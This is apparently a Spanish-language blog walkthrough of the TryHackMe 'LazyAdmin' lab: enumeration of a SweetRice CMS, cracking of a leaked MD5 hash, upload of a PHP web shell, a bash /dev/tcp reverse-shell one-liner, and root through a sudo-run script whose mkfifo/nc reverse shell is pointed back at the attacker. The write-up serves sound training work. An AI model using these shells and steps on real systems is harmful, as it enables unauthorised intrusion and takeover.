---
layout: single
title: LazyAdmin - TryHackMe
excerpt: "La maquina LazyAdmin de la plataforma de Tryhackme esta catalogada como facil donde nos dicen que hay muchas formas de hacer la maquina tendremos que aprovecharnos de una vulnerabilidad que tiene el servicio SweetRice CMS para mediante un archivo expuesto tener el nombre de usuario y posteriormente crackearemos el hash MD5 que es muy debil para conectarnos al servicio despues subiremos nuestra reverse shell para ganar acceso como www-data para la escalada nos aprovecharemos que podemos alterar un archivo que ejecuta root"
date: 2023-03-07
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/try-writeup-lazyadmin/icon.jpg
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - infosec
tags:  
  - SweetRice CMS 1.5.1
  - Sudoers Privilege
---
<p align="center">
<img src="/assets/images/try-writeup-lazyadmin/icon.jpg">
</p>

```bash
❯ ping -c 1 10.10.130.234
PING 10.10.130.234 (10.10.130.234) 56(84) bytes of data.
64 bytes from 10.10.130.234: icmp_seq=1 ttl=61 time=219 ms

--- 10.10.130.234 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 218.968/218.968/218.968/0.000 ms
❯ whichSystem.py 10.10.130.234

10.10.130.234 (ttl -> 61): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.10.130.234 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 20:40 CST
Nmap scan report for 10.10.130.234
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 497cf741104373da2ce6389586f8e0f0 (RSA)
|   256 2fd7c44ce81b5a9044dfc0638c72ae55 (ECDSA)
|_  256 61846227c6c32917dd27459e29cb905e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Enumeracion

```bash
❯ nmap --script=http-enum -p80 10.10.130.234 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 20:41 CST
Nmap scan report for 10.10.130.234
Host is up (0.21s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /content/: Potentially interesting folder
```

```ruby
❯ whatweb http://10.10.130.234
http://10.10.130.234 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.130.234], Title[Apache2 Ubuntu Default Page: It works]
```

Esta es la web

![](/assets/images/try-writeup-lazyadmin/Web1.png)

Vamos a ver si podemos ver `/content/` que nos reporto `nmap`

Esto es lo que nos muestra 

![](/assets/images/try-writeup-lazyadmin/Web2.png)

Vamos a hacer `fuzzing`

```bash
❯ gobuster dir -u http://10.10.130.234/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 15 --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.130.234/
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/07 20:47:58 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd/           (Status: 403) [Size: 278]
/.htaccess/           (Status: 403) [Size: 278]
/.hta/                (Status: 403) [Size: 278]
/content/             (Status: 200) [Size: 2199]
/icons/               (Status: 403) [Size: 278] 
/server-status/       (Status: 403) [Size: 278] 
                                                
===============================================================
2023/03/07 20:49:06 Finished
===============================================================
```

No podemos ver ningun recurso que tenga el estado `403` por que no tenemos capacidad de lectura solo el de `200` OK que ese ya lo habiamos visto

Si volvemos a hacer `fuzzing` a esta ruta encontramos esto

```bash
❯ gobuster dir -u http://10.10.130.234/content/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 15 --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.130.234/content/
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/07 20:55:37 Starting gobuster in directory enumeration mode
===============================================================
/images/              (Status: 200) [Size: 3444]
/js/                  (Status: 200) [Size: 1777]
/inc/                 (Status: 200) [Size: 6685]
/as/                  (Status: 200) [Size: 3669]
/_themes/             (Status: 200) [Size: 964] 
/attachment/          (Status: 200) [Size: 774] 
```

Si revisamos la ruta `images` encontramos esto

![](/assets/images/try-writeup-lazyadmin/Web3.png)

Si das click en `sitemap.xsl` nos descarga ese archivo vamos a ver que contiene 
```html
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0" 
                xmlns:html="http://www.w3.org/TR/REC-html40"
                xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
	<xsl:output method="html" version="1.0" encoding="UTF-8" indent="yes"/>
	<xsl:template match="/">
		<html xmlns="http://www.w3.org/1999/xhtml">
			<head>
				<meta content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=0" name="viewport" id="viewport"/>
				<title>XML Sitemap</title>
				<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
				<style type="text/css">
					body {
						font-family:"Microsoft Yahei","Lucida Grande","Lucida Sans Unicode",Tahoma,Verdana;
						padding: 0px;
						margin: 0px;
					}
					
					#intro {
						background-color:#CFEBF7;
						border:1px #2580B2 solid;
						padding:5px 13px 5px 13px;
						margin:10px;
					}
					
					#intro p {
						line-height:	16.8667px;
					}
					
					td {
						font-size:11px;
					}
					
					th {
						text-align:left;
						font-size:11px;
					}
					
					tr.high {
						background-color:whitesmoke;
					}
					
					#footer {
						padding:2px;
						margin:10px;
						font-size:8pt;
						color:gray;
					}
					
					#footer a {
						color:gray;
					}
					
					a {
						color:black;
					}
				</style>
			</head>
			<body>
				<h1>SweetRice XML Sitemap</h1>
				<div id="intro">
					<p>
SweetRice Website Program.
					</p>
				</div>
				<div id="content">
					<table cellpadding="0">
						<tr style="border-bottom:1px black solid;">
							<th>URL</th>
							<th>Priority</th>
							<th>Change Frequency</th>
							<th>LastChange</th>
						</tr>
						<xsl:variable name="lower" select="'abcdefghijklmnopqrstuvwxyz'"/>
						<xsl:variable name="upper" select="'ABCDEFGHIJKLMNOPQRSTUVWXYZ'"/>
						<xsl:for-each select="sitemap:urlset/sitemap:url">
							<tr>
								<xsl:if test="position() mod 2 != 1">
									<xsl:attribute  name="class">high</xsl:attribute>
								</xsl:if>
								<td>
									<xsl:variable name="itemURL">
										<xsl:value-of select="sitemap:loc"/>
									</xsl:variable>
									<a href="{$itemURL}">
										<xsl:value-of select="sitemap:loc"/>
									</a>
								</td>
								<td>
									<xsl:value-of select="concat(sitemap:priority*100,'%')"/>
								</td>
								<td>
									<xsl:value-of select="concat(translate(substring(sitemap:changefreq, 1, 1),concat($lower, $upper),concat($upper, $lower)),substring(sitemap:changefreq, 2))"/>
								</td>
								<td>
									<xsl:value-of select="concat(substring(sitemap:lastmod,0,11),concat(' ', substring(sitemap:lastmod,12,5)))"/>
								</td>
							</tr>
						</xsl:for-each>
					</table>
				</div>
				<div id="footer">
					Powered by <a href="http://www.Basic-cms.org">Basic-cms.org</a> SweetRice
				</div>
			</body>
		</html>
	</xsl:template>
</xsl:stylesheet>
```

Si examinamos la ruta `as` encontramos un panel de `login`

![](/assets/images/try-writeup-lazyadmin/Web4.png)

Si volvemos a ver la ruta `inc` vemos el directorio `mysql_backup/`

![](/assets/images/try-writeup-lazyadmin/Web5.png)

Vemos esto

![](/assets/images/try-writeup-lazyadmin/Web6.png)

Pinchamos en el para descargarlo 

Este es el contenido

```php
<?php return array (
  0 => 'DROP TABLE IF EXISTS `%--%_attachment`;',
  1 => 'CREATE TABLE `%--%_attachment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `post_id` int(10) NOT NULL,
  `file_name` varchar(255) NOT NULL,
  `date` int(10) NOT NULL,
  `downloads` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  2 => 'DROP TABLE IF EXISTS `%--%_category`;',
  3 => 'CREATE TABLE `%--%_category` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `link` varchar(128) NOT NULL,
  `title` text NOT NULL,
  `description` varchar(255) NOT NULL,
  `keyword` varchar(255) NOT NULL,
  `sort_word` text NOT NULL,
  `parent_id` int(10) NOT NULL DEFAULT \'0\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `link` (`link`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  4 => 'DROP TABLE IF EXISTS `%--%_comment`;',
  5 => 'CREATE TABLE `%--%_comment` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(60) NOT NULL DEFAULT \'\',
  `email` varchar(255) NOT NULL DEFAULT \'\',
  `website` varchar(255) NOT NULL,
  `info` text NOT NULL,
  `post_id` int(10) NOT NULL DEFAULT \'0\',
  `post_name` varchar(255) NOT NULL,
  `post_cat` varchar(128) NOT NULL,
  `post_slug` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `ip` varchar(39) NOT NULL DEFAULT \'\',
  `reply_date` int(10) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  6 => 'DROP TABLE IF EXISTS `%--%_item_data`;',
  7 => 'CREATE TABLE `%--%_item_data` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `data_type` varchar(20) NOT NULL,
  `name` varchar(255) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `item_id` (`item_id`),
  KEY `item_type` (`item_type`),
  KEY `name` (`name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  8 => 'DROP TABLE IF EXISTS `%--%_item_plugin`;',
  9 => 'CREATE TABLE `%--%_item_plugin` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `item_id` int(10) NOT NULL,
  `item_type` varchar(255) NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  10 => 'DROP TABLE IF EXISTS `%--%_links`;',
  11 => 'CREATE TABLE `%--%_links` (
  `lid` int(10) NOT NULL AUTO_INCREMENT,
  `request` text NOT NULL,
  `url` text NOT NULL,
  `plugin` varchar(255) NOT NULL,
  PRIMARY KEY (`lid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
  12 => 'DROP TABLE IF EXISTS `%--%_options`;',
  13 => 'CREATE TABLE `%--%_options` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content` mediumtext NOT NULL,
  `date` int(10) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;',
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
  15 => 'INSERT INTO `%--%_options` VALUES(\'2\',\'categories\',\'\',\'1575023409\');',
  16 => 'INSERT INTO `%--%_options` VALUES(\'3\',\'links\',\'\',\'1575023409\');',
  17 => 'DROP TABLE IF EXISTS `%--%_posts`;',
  18 => 'CREATE TABLE `%--%_posts` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `body` longtext NOT NULL,
  `keyword` varchar(255) NOT NULL DEFAULT \'\',
  `tags` text NOT NULL,
  `description` varchar(255) NOT NULL DEFAULT \'\',
  `sys_name` varchar(128) NOT NULL,
  `date` int(10) NOT NULL DEFAULT \'0\',
  `category` int(10) NOT NULL DEFAULT \'0\',
  `in_blog` tinyint(1) NOT NULL,
  `views` int(10) NOT NULL,
  `allow_comment` tinyint(1) NOT NULL DEFAULT \'1\',
  `template` varchar(60) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `sys_name` (`sys_name`),
  KEY `date` (`date`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;',
);?>
```

Si lo examinamos vemos una contraseña

![](/assets/images/try-writeup-lazyadmin/Web7.png)

Bueno al parecer se ve un hash muy debil

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)
1g 0:00:00:00 DONE (2023-03-07 21:16) 11.11g/s 375466p/s 375466c/s 375466C/s 062089..redlips
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Vamos a probar las credenciales en el panel de login que vimos 

`manager:Password123`

Funcionan 

![](/assets/images/try-writeup-lazyadmin/Web8.png)

Bueno si investigamos la version tiene varias vulnerabilidades 

```bash
❯ searchsploit sweetrice
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                                       | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                                    | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                                     | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                                       | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                                           | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                                                  | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                             | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                                         | php/webapps/14184.txt
---------------------------------------------------------------------------------------------- ---------------------------------
```

En esta parte del `web` se ve que podemos subir arcihvo vamos a subir un archivo que nos envie una reverse shell en php pero con terminacion `.php5`

![](/assets/images/try-writeup-lazyadmin/Web9.png)

Asi que solo sube este archivo 

```bash
<?php echo system($_GET['cmd']);?>
```

Despues pincha en el archivo que subiste y funcina

![](/assets/images/try-writeup-lazyadmin/Web10.png)

Ahora vamos a ganar acceso ponte en escucha por un puerto

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Despues ejecutas este oneliner en la web

```
?cmd=bash -c "bash -i >%26 /dev/tcp/IP/PORT 0>%261"
```

Y ganamos acceso

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.28.226] from (UNKNOWN) [10.10.130.234] 37272
bash: cannot set terminal process group (1061): Inappropriate ioctl for device
bash: no job control in this shell
www-data@THM-Chal:/var/www/html/content/attachment$
```

Como siempre para poder hacer `ctrl+c` 

```
script /dev/null -c bash
CTRL+Z
stty raw echo; fg
reset xterm
ENTER
export TERM=xterm
export SHELL=bash
```

Vemos la primer flag

```bash
www-data@THM-Chal:/home$ cd itguy/
www-data@THM-Chal:/home/itguy$ ls
Desktop    Downloads  Pictures	Templates  backup.pl	    mysql_login.txt
Documents  Music      Public	Videos	  examples.desktop  user.txt
www-data@THM-Chal:/home/itguy$ cat user.txt 
THM{63e5bce9271952aad1113b6f1ac28a07}
www-data@THM-Chal:/home/itguy$ 
```

## Escalada de privilegios

Estos usuarios tienen una `bash`

```bash
www-data@THM-Chal:/home/itguy$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
itguy:x:1000:1000:THM-Chal,,,:/home/itguy:/bin/bash
guest-3myc2b:x:998:998:Guest:/tmp/guest-3myc2b:/bin/bash
```

Y bueno podemos ejecutar el comando sin proporcionar contraseña

```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ 
```

Esto contiene `backup.pl`

```bash
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
www-data@THM-Chal:/home/itguy$ 

```

Este es el contenido de `copy.sh`

```bash
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
www-data@THM-Chal:/home/itguy$ 
```

Vamos a escalar privilegios la lo primero que puedes hacer es cambiar tu ip y el puerto para que te mande una reverse shell a tu sistema por que puedes alterar el archivo

```
www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl 
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.2.28.226] from (UNKNOWN) [10.10.130.234] 37276
# whoami
root
i# d
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt  
THM{6637f41d0177b6f37cb20d775124699f}
# 
```
